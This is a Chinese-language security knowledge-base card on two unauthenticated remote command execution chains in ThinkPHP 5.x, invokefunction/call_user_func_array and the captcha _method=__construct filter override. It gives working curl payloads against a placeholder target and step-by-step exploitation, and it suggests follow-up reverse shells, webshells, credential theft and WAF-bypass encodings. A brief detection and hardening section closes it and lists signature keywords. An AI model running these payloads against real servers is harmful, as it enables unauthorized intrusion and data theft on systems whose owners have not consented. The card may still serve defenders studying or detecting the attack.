---
id: web-php-framework-thinkphp-5x-invokefunction-captcha-rce
title: ThinkPHP 5.x RCE：invokefunction 任意函数调用与 captcha _method=__construct 过滤器注入
type: scenario
domain: web
path: web/php/framework
technique: thinkphp-5x-invokefunction-captcha-method-rce
aliases:
- ThinkPHP 5.x RCE
- ThinkPHP invokefunction
- call_user_func_array
- s=captcha
- _method=__construct
- filter[]=system
tags:
- php
- thinkphp
- framework
- rce
- invokefunction
- captcha
- method-override
- command-injection
cve: []
severity: critical
confidence: medium
status: verified
affected_versions: ThinkPHP 5.x
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V137
  verified_at: '2026-11-06T05:44:12+08:00'
  notes: 已对照原文核对：卡片两条 ThinkPHP 5.x payload（invokefunction 的 s=index/\think\app/invokefunction + function=call_user_func_array + vars[0]=system；captcha 的 _method=__construct + filter[]=system + method=GET + server[REQUEST_METHOD]）与原文 thinkphp_rce 插件代码逐字一致；原文内联3图仅为插件列表/目录结构/actuator 访问演示，无真实 ThinkPHP 成功回显，故保留 confidence=medium。affected_versions 已按原文标记改为 ThinkPHP 5.x（原文未给具体小版本）。未验证点：未对真实 ThinkPHP 靶机执行 PoC；原文示例 uid=33 输出为演示数据。
---

## 一句话结论

ThinkPHP 5.x 存在两条常见的未授权命令执行路径：`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=命令` 直接调用任意函数；`POST /index.php?s=captcha` 配合 `_method=__construct&filter[]=system&server[REQUEST_METHOD]=命令` 覆盖 Request 的过滤器后执行命令。

## 原理

- **invokefunction 链**：ThinkPHP 5.x 的路由解析允许 `s=index/\think\app/invokefunction` 调用 `\think\App::invokeFunction`。该方法从请求参数读取 `$function` 与 `$vars`，最终执行 `call_user_func_array($function, $vars)`；函数名和参数都可由请求控制，且没有白名单，因此 `function=call_user_func_array`、`vars[0]=system`、`vars[1][]=id` 会变成 `call_user_func_array('system', ['id'])`。
- **captcha 链**：`s=captcha` 会路由到验证码控制器。请求参数 `_method=__construct` 让框架把 `__construct` 当作 Request 的方法调用，从而用攻击者提供的参数重新构造 Request 对象；其中 `filter[]=system` 覆盖 Request 的 `filter` 属性，`server[REQUEST_METHOD]=命令` 被当作“请求方法”传入过滤器回调，最终等价于 `system('命令')`。
- **为什么成立**：两条链都源于框架把用户可控的参数用于动态函数/方法调用，且没有对可调用函数、过滤器回调做白名单或转义。ThinkPHP 5.x 默认路由开启时，攻击者无需登录即可触发。
- **影响**：Web 进程权限下的任意命令执行；常见权限为 `www-data`，若服务以 root 运行则直接 root。

## 触发条件

- 目标运行 ThinkPHP 5.x，`index.php?s=...` 路由解析开启（默认常见）。
- invokefunction 链要求 `\think\App::invokeFunction` 可被路由调用；captcha 链要求验证码路由/组件可用。
- 无需认证；若目标有 WAF，可能需对反斜杠、方括号、关键字做编码或变形。
- 命令执行回显取决于目标配置；无回显时可用写文件、DNS/HTTP 带外或延时判断。

## 利用步骤

1. 指纹确认：访问 `/index.php`、`/thinkphp/logo.png` 等，或观察 `X-Powered-By`/报错页特征，判断是否为 ThinkPHP 5.x。
2. 先发无害命令验证回显，例如 `id`、`echo VULN_VERIFY_OK`；用唯一字符串避免把缓存/其他响应误判为命令输出。
3. invokefunction 链：GET 请求 `s=index/\think\app/invokefunction`，`function=call_user_func_array`，`vars[0]=system`，`vars[1][]=命令`。
4. 若 invokefunction 被拦截，改试 captcha 链：POST `s=captcha`，body 为 `_method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=命令`。
5. 验证成功后，可执行反弹 shell、写 webshell、读取配置文件/数据库凭据；注意目标 disable_functions 与 WAF 限制。

## PoC

```bash
# 1) invokefunction 链
curl -s 'http://target/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'

# 2) captcha + _method=__construct 链
curl -s -X POST 'http://target/index.php?s=captcha' \
  --data '_method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=id'
```

验证用唯一标记（避免误判）：

```bash
curl -s 'http://target/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20VULN_VERIFY_OK'
```

## 变体与关联

- **函数变体**：`vars[0]` 可换成 `assert`、`phpinfo`、`file_put_contents` 等；`vars[1][]` 可传多个参数。
- **命令变体**：`system` 可换 `exec`、`shell_exec`、`passthru`、`popen`，视 `disable_functions` 而定。
- **编码/绕过**：对 `\think\app` 的反斜杠、`vars[0]` 的方括号做 URL 编码；大小写/多余斜杠/`?s=` 参数位置变形可绕过部分 WAF 规则。
- **captcha 链变体**：`filter[]` 可指向其他回调；`server[REQUEST_METHOD]` 为命令字符串；也可结合 `method=GET` 控制请求方法。
- **关联卡片**：[[web-php-framework-laravel-ignition-debug-log-phar-rce]]（另一 PHP 框架 RCE）、[[web-php-file-inclusion-thinkphp-view-template]]（ThinkPHP 模板路径穿越/文件包含）、[[web-php-rce-disable-functions-ld-preload]]（disable_functions 绕过）。

## 检测与防御

- **检测**：Web 日志中出现 `invokefunction`、`call_user_func_array`、`_method=__construct`、`filter[]=system`、`server[REQUEST_METHOD]` 等特征；`s=` 参数含反斜杠或框架内部类名；异常命令执行/外连。
- **防御**：升级到不受影响的 ThinkPHP 版本；关闭不必要的 `s` 路由/验证码路由；对 `function`、`vars`、`_method`、`filter` 等参数做严格白名单；禁止用户可控的 `call_user_func_array` 与过滤器回调；WAF 拦截上述特征；Web 服务以低权限运行，禁用危险函数。
- **加固**：生产环境关闭调试与详细报错；限制 `index.php` 直接访问；对框架路由做统一鉴权。
